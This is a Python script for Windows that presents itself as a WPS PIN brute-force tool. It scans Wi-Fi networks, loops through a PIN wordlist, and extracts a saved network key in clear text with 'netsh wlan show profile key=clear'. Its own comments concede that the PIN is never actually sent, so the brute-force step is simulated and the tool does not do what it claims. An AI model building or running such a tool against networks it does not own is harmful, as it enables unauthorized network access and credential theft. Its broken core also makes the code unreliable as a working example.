import os
import subprocess
import re
import time

def list_interfaces():
    """Lists all available wireless interfaces."""
    try:
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
        interfaces = re.findall(r"Name\s+:\s(.+)", result.stdout)
        return interfaces
    except Exception as e:
        print(f"Error listing interfaces: {e}")
        return []

def scan_wifi(interface):
    """Scans and lists available WiFi networks on the selected interface."""
    try:
        # Disconnect from any existing connection
        subprocess.run(["netsh", "wlan", "disconnect"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Scan for networks using the selected interface
        result = subprocess.run(["netsh", "wlan", "show", "networks", "interface=" + interface], capture_output=True, text=True)
        networks = re.findall(r"SSID \d+ : (.+)", result.stdout)
        return networks
    except Exception as e:
        print(f"Error scanning WiFi: {e}")
        return []

def connect_wps(interface, ssid, wps_pin):
    """Attempts to connect using WPS PIN (if supported)."""
    try:
        print(f"\n[+] Trying WPS PIN: {wps_pin} for SSID: {ssid} on interface: {interface}")
        
        # Attempt to connect to the network with the given PIN
        # Note: Windows does not natively support WPS PIN cracking via `netsh`.
        # This step assumes you have a tool or script that can handle WPS PINs.
        # For demonstration purposes, we simulate a connection attempt here.
        result = subprocess.run(
            ["netsh", "wlan", "connect", f"name={ssid}", f"ssid={ssid}", f"interface={interface}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for the connection to establish
        time.sleep(5)  # Adjust this based on your network's response time
        
        # Check if the connection was successful
        return check_connection(interface, ssid)
    except Exception as e:
        print(f"Error connecting: {e}")
        return False

def check_connection(interface, ssid):
    """Checks if connected to the given WiFi network on the specified interface."""
    try:
        result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
        if ssid in result.stdout and interface in result.stdout:
            print("[✔] Successfully connected!")
            return True
        return False
    except Exception as e:
        print(f"Error checking connection: {e}")
        return False

def get_wifi_password(ssid):
    """Retrieves the saved WiFi password."""
    try:
        result = subprocess.run(f'netsh wlan show profile name="{ssid}" key=clear', capture_output=True, text=True)
        password_match = re.search(r"Key Content\s+:\s(.+)", result.stdout)
        return password_match.group(1) if password_match else "N/A"
    except Exception as e:
        print(f"Error retrieving password: {e}")
        return "N/A"

def load_pins(file_path="./lists/pins.txt"):
    """Loads WPS PINs from a file."""
    try:
        with open(file_path, "r") as file:
            pins = [line.strip() for line in file.readlines() if line.strip()]
        return pins
    except FileNotFoundError:
        print(f"[!] File '{file_path}' not found.")
        return []
    except Exception as e:
        print(f"Error loading PINs: {e}")
        return []

def main():
    # Step 1: List available wireless interfaces
    interfaces = list_interfaces()
    if not interfaces:
        print("[!] No wireless interfaces found.")
        return
    
    print("\nAvailable Wireless Interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"{i+1}. {iface}")
    
    try:
        iface_choice = int(input("\nSelect your wireless interface (number): ")) - 1
        if iface_choice < 0 or iface_choice >= len(interfaces):
            print("[!] Invalid choice.")
            return
    except ValueError:
        print("[!] Please enter a valid number.")
        return
    
    selected_interface = interfaces[iface_choice]
    print(f"\n[*] Selected Interface: {selected_interface}")
    
    # Step 2: Scan for available WiFi networks on the selected interface
    print(f"[*] Scanning for available WiFi networks on interface: {selected_interface}...")
    networks = scan_wifi(selected_interface)
    if not networks:
        print("[!] No networks found. Ensure WiFi is enabled.")
        return
    
    print("\nAvailable WiFi Networks:")
    for i, ssid in enumerate(networks):
        print(f"{i+1}. {ssid}")
    
    try:
        choice = int(input("\nSelect your network (number): ")) - 1
        if choice < 0 or choice >= len(networks):
            print("[!] Invalid choice.")
            return
    except ValueError:
        print("[!] Please enter a valid number.")
        return
    
    selected_ssid = networks[choice]
    print(f"\n[*] Selected Network: {selected_ssid}")
    
    # Step 3: Load WPS PINs from pins.txt
    pins = load_pins()
    if not pins:
        print("[!] No PINs loaded. Ensure 'pins.txt' exists and contains valid PINs.")
        return
    
    print(f"[*] Loaded {len(pins)} PINs from 'pins.txt'. Starting brute-force...")
    
    # Step 4: Try each PIN
    for pin in pins:
        if connect_wps(selected_interface, selected_ssid, pin):
            print(f"\n[✔] Successfully connected with WPS PIN: {pin}")
            
            # Retrieve the WiFi password
            password = get_wifi_password(selected_ssid)
            print(f"\n[✔] WiFi Password for {selected_ssid}: {password}")
            break
        else:
            print(f"[!] Failed with PIN: {pin}")
    
    print("\n[*] Brute-force completed.")

if __name__ == "__main__":
    main()